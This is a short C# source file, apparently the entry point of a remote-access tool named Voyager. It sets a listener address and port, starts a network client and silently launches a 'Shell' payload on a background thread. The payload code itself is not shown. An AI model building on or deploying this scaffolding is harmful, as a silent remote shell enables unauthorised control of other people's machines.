using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Voyager
{
    class Entry
    {
        public static String IP = "127.0.0.1";
        public static int Port = 8056;
        public static bool KeepAlive = true;
        public static void init()
        {
            Program.client.Start();
            Debug.WriteLine("Executing Payloads");
            Task.Factory.StartNew(() => execPayloads(true));
            Debug.WriteLine("Voyager Started");
            Debug.WriteLine("Main Thread Sleeping");
            while (true) { }
        }

        public static void execPayloads(bool silent = false)
        {
            if (silent)
            {
                Task.Factory.StartNew(() => Voyager.Payloads.Shell.start());
                Thread.Sleep(1000);
                Debug.Write("Shell Payload Executed");
            }
        }
    }
}
